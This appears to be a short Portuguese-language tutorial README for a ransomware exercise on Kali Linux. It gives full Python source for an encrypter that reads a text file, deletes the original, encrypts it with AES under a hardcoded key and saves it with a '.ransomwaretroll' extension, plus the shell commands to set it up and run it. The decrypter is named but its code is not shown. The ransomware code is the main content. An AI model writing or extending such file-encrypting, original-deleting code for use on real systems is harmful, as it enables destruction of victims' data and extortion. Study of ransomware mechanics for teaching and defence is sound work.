# Ransomware para criptografar arquivos

### Ferramentas

- Kali Linux
- Python
- vim

### Criando os códigos e arquivos

- Criar diretório e arquivos de código e texto
$ mkdir desafio-ransomware
$ touch encrypter.py
$ touch decrypter.py
$ touch teste.txt

- Criar o código do arquivo encrypter.py
$ vim encrypter.py

```python 
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```

- Criar o código do arquivo decrypter.py
$ vim decrypter.py


- Criar o conteúdo do arquivo de texto
$ vim teste.txt


### Instalando biblioteca pyaes para execução do código
- Instalar a biblioteca pyaes
$ sudo apt install python3-pyaes


### Criptografando o arquivo
- Executar o comandos
$ python3 encrypter.py
$ cat teste.txt


### Descriptografando o arquivo
- Executar o comandos
$ python3 decrypter.py
$ cat teste.txt
